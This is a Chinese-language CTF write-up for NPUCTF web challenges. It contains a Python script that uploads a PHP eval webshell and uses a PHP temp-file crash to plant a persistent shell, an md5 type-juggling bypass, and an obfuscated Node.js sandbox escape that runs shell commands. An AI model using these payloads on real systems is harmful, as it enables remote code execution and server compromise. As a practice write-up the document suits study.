# NPUCTF

## ReadlezPHP

## Ezinclude (赛后复现)

刚开始貌似是个逻辑漏洞

随便填个东西，在Request里就可以看到hash，然后用那个当passwd即可

第二步include 

- 利用点 php7 segment fault 导致文件被保存在/tmp/phpXXXXXX下

爆破半天，发现有dir.php可以看/tmp目录下文件。。。。

网上找到一个脚本魔改了一下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
import itertools
import time

charset = string.digits + string.letters

base_url = "http://6a1c86d0-5362-4d88-b33e-7514e488b64c.node3.buuoj.cn"


def upload_file_to_include(url, file_content):
    files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
    try:
        #print url
        response = requests.post(url, files=files,allow_redirects=False)
        #print response.text
    except Exception as e:
        print e


def generate_tmp_files():
    webshell_content = "<?php eval($_REQUEST['eki']);?>".encode(
        "base64").strip().encode("base64").strip().encode("base64").strip()
    #file_content = '<?php if(file_put_contents("/tmp/eki", base64_decode("%s"))){echo "flag";}?>' % (
    #    webshell_content)
    
    file_content =  "<?php eval($_REQUEST['eki']); file_put_contents('./eki.php',\"<?php eval(\$_REQUEST['eki']); echo 123;?>\"); echo eki;?>"# 为啥这样写是因为一开始蚁剑始终连不上....

    phpinfo_url = "%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd" % (
        base_url)
    length = 6
    times = len(charset) ** (length / 2)
    for i in xrange(times):
        print "[+] %d / %d" % (i, times)
        upload_file_to_include(phpinfo_url, file_content)
        time.sleep(0.5)


def main():
    generate_tmp_files()


if __name__ == "__main__":
    main()
```

然后``GET /flflflflag.php?file=/tmp/phpXXXXXX`` 看到返回``eki``,shell``eki.php``就生成了


## 验证🐎 (赛后复现)

弱类型比较+原型链污染

可以拿到源码

```js
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```


```js
if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0]))
```

本来想着md5前缀碰撞的但是没构造出了，然后就是方向错了.....

这里绕过利用js 任意数据+字符串会转换成字符串的特性

然后用``[1]``和``1``就行了

传数组的话，用json来传输

然后就是绕过这个``SafeEval``

```js
function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
}
```

可以用[regex101](https://regex101.com/)去试

可以发现只能用Math函数

那么就用他来原型链污染了

```
Math.constructor
ƒ Object() { [native code] }
b = Math+1
"[object Math]1"
b.constructor
ƒ String() { [native code] }
Math.constructor.constructor
ƒ Function() { [native code] }
```

Math+1把Math.constructor变成String

可以用这个脚本生成CharCode

```python
#coding=utf-8
payload = "return process.mainModule.require('child_process').execSync('cat /flag')"

print "("+",".join([str(ord(i)) for i in payload])+")"
```

Exp
```js
(Math=>(
    Math=Math.constructor,
    Math.x=Math.constructor(
        Math.fromCharCode(
114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)
        )()))(Math+1)
```

## 参考资料

https://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/